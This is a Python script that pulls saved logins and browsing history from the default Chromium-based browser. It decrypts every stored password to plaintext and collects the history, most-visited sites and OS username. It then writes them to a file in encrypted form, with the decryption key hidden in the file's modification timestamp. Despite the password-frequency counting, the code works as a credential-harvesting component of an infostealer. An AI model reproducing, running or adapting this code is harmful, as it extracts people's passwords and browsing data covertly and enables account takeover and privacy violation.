import sys
import os
import json

# used for fernet encryption
import time
from cryptography.fernet import Fernet
import base64
import hashlib

import chromiumBrowser
import dataComprehention
import getBrowser


if len(sys.argv) < 2: exit()


chromiumParams = getBrowser.getChromiumParams()
defaultBrowser = chromiumBrowser.Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])

#googleChrome = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
#microsoftEdge = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
#operaGX = chromiumBrowser.Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")

history = defaultBrowser.getHistory()
loginData = defaultBrowser.getLoginData()

passwordsAndFreq = {}
for login in loginData:
    url = login["origin_url"]
    username = login["username_value"]
    ciphertext = login["password_value"]

    if url == "" or username == "": continue
    secretKey = defaultBrowser.getSecretKey()
    password = defaultBrowser.decryptPassword(ciphertext, secretKey)
    if password == '': continue

    if password in passwordsAndFreq.keys(): passwordsAndFreq[password] += 1
    else: passwordsAndFreq[password] = 1
    #print(password)

#print(passwordsAndFreq)

topWebsites = dataComprehention.topWebsitesVisited(history)
#print(topWebsites)

# clear the temp folder to remove clutter
#defaultBrowser.cleanup()


username = os.getlogin()

outputFilePath = os.path.join(sys.argv[1], "userdata.cn")
key = round(time.time())
sha256Bytes = hashlib.sha256(str(key).encode()).digest()[:32]
b64Key = base64.urlsafe_b64encode(sha256Bytes)

def encryptString(key, inputString):
    encrypter = Fernet( key )
    bytes = encrypter.encrypt(inputString.encode())
    return bytes

with open(outputFilePath, "wb") as f:    
    f.writelines([
        encryptString(b64Key, username), b"\n",
        encryptString(b64Key, json.dumps( history )), b"\n",
        encryptString(b64Key, json.dumps( topWebsites )), b"\n",
        encryptString(b64Key, json.dumps( passwordsAndFreq )), b"\n",
    ])

# Sets the date modified so the key is present and changes everytime encrypted
os.utime(outputFilePath, (key, key))